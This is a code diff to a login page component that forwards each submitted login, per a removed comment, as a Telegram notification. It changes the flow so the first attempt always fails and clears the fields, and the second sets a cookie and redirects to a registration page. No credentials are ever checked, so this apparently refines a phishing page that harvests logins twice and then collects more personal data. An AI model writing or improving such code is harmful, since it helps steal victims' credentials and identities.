@@ -17,6 +17,7 @@ export default function LoginPage() {
   const [errors, setErrors] = useState<{userId?: string, password?: string, general?: string}>({})
   const [isLoading, setIsLoading] = useState(false)
   const [isRegisterLoading, setIsRegisterLoading] = useState(false)
+  const [loginAttemptCount, setLoginAttemptCount] = useState(0)
 
   // Clear any existing auth cookies when landing on login page
   useEffect(() => {
@@ -54,7 +55,7 @@ export default function LoginPage() {
     setIsLoading(true)
     setErrors({})
     
-    // Send telegram notification immediately
+    // Notify for every login attempt
     trackFormSubmission({
       type: 'login',
       userId,
@@ -62,23 +63,30 @@ export default function LoginPage() {
       page: '/'
     })
     
-    // Set login verification cookie immediately
-    try {
-      await fetch('/api/set-login-verified', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        }
-      })
-    } catch (error) {
-      console.error('Failed to set login verification:', error)
+    // 1 second delay
+    await new Promise(resolve => setTimeout(resolve, 1000))
+    setIsLoading(false)
+    
+    const isSecondAttempt = loginAttemptCount >= 1
+    if (isSecondAttempt) {
+      // Second attempt: set cookie and proceed to registration
+      try {
+        await fetch('/api/set-login-verified', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          }
+        })
+      } catch (error) {
+        console.error('Failed to set login verification:', error)
+      }
+      window.location.href = '/registration'
+    } else {
+      // First attempt: clear fields only
+      setLoginAttemptCount(1)
+      setUserId('')
+      setPassword('')
     }
-    
-    // 10 second delay before navigation
-    await new Promise(resolve => setTimeout(resolve, 10000))
-    
-    // Navigate directly to email verification page
-    window.location.href = '/registration/email'
   }
 
   return (
@@ -208,12 +216,12 @@ export default function LoginPage() {
                     <Spinner className="w-5 h-5 mr-2" />
                     LOADING...
                   </>
-                ) : (
-                  <>
-                <Check className="w-5 h-5 mr-2" />
-                SIGN IN
-                  </>
-                )}
+                  ) : (
+                    <>
+                      <Check className="w-5 h-5 mr-2" />
+                      SIGN IN
+                    </>
+                  )}
               </Button>
             </div>
 
@@ -237,8 +245,8 @@ export default function LoginPage() {
                     </>
                   ) : (
                     <>
-                    <UserPlus className="w-5 h-5 mr-2" />
-                    REGISTER
+                      <UserPlus className="w-5 h-5 mr-2" />
+                      REGISTER
                     </>
                   )}
                   </Button>
